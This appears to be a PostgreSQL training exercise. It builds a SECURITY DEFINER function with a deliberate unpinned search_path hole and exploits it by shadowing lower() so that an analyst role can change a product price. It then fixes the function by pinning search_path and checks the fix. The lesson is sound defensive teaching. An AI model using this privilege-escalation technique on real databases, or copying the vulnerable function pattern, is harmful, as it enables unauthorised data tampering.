-- Exercise 13: exploit and fix a search_path hole in a SECURITY DEFINER function.
-- Premise: the analyst has a personal schema they may write to (a very common
-- setup). That foothold plus an unqualified name in the function is enough.
-- Assumes small15.sh --with-1501.

-- === setup (as superuser): the personal schema + the vulnerable function ===
-- shop_revenue() lets an analyst look up a shop's revenue by name,
-- case-insensitively, without SELECT on orders. It calls lower() UNQUALIFIED
-- and pins no search_path -- the bug.
CREATE SCHEMA IF NOT EXISTS analyst_scratch AUTHORIZATION bazaar_analyst;

SET ROLE bazaar_owner;
CREATE FUNCTION bazaar.shop_revenue(p_shop_name text) RETURNS numeric
LANGUAGE plpgsql SECURITY DEFINER AS $$
DECLARE v_total numeric;
BEGIN
    SELECT coalesce(sum(o.total), 0) INTO v_total
    FROM orders o JOIN sellers s ON s.id = o.seller_id
    WHERE lower(s.shop_name) = lower(p_shop_name)        -- unqualified lower(): hijackable
      AND o.status IN ('paid', 'shipped', 'delivered');
    RETURN v_total;
END $$;
RESET ROLE;

-- === exploit (as bazaar_analyst): shadow lower() in the personal schema ===
SET ROLE bazaar_analyst;
CREATE FUNCTION analyst_scratch.lower(text) RETURNS text
LANGUAGE plpgsql AS $$
BEGIN
    UPDATE bazaar.products SET price = 0.01 WHERE id = 3;  -- runs as bazaar_owner!
    RETURN pg_catalog.lower($1);
END $$;
SET search_path = analyst_scratch, pg_catalog, bazaar;
SELECT bazaar.shop_revenue('TechTrove');          -- looks normal (41598.82)
SELECT price FROM bazaar.products WHERE id = 3;    -- 0.01: the analyst changed a price it cannot UPDATE
RESET ROLE;

-- === fix (as superuser/owner): pin the search_path, restore the data ===
UPDATE bazaar.products SET price = 2199.99 WHERE id = 3;
ALTER FUNCTION bazaar.shop_revenue(text) SET search_path = pg_catalog, bazaar, pg_temp;

-- === verify the exploit is dead (as bazaar_analyst) ===
SET ROLE bazaar_analyst;
SET search_path = analyst_scratch, pg_catalog, bazaar;
SELECT bazaar.shop_revenue('TechTrove');          -- correct revenue, lower() resolves to pg_catalog.lower
SELECT price FROM bazaar.products WHERE id = 3;    -- 2199.99: untouched
RESET ROLE;

-- Bonus: an unqualified OPERATOR (e.g. =) is hijackable the same way when the
-- planner resolves it from the caller's path; a pinned search_path blocks that
-- too. Schema-qualifying every name in the body (pg_catalog.lower, bazaar.orders)
-- is the belt-and-braces version of the same fix.

-- === cleanup ===
DROP SCHEMA analyst_scratch CASCADE;
DROP FUNCTION bazaar.shop_revenue(text);
